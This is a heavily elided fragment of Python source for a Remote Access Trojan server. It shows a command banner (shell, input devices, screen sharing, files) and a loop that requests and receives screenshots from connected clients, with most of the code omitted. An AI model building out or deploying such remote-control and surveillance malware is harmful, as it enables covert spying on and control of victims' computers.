...
#********************************** RAT Project*************************************************#
# This is the main Remote Access Trojan (RAT) server implementation that handles client connections
# and provides remote control capabilities
...
class RAT_SERVER:
    ...
    def banner(self):
        # Displaying the available commands and their descriptions
        # Commands are grouped by category: System, Shell, Network, Input devices, Video, Files
...
''')
        ...
        print("Video: ")
        print("======================================================")
        print(f'''screenshare               overseing remote PC
    ...
    def execute(self):
        ...
        while True:
            ...
            # Surveillance commands
                ...
                # Capture and save screenshot from client
                client.send(command.encode())
                file = client.recv(2147483647)
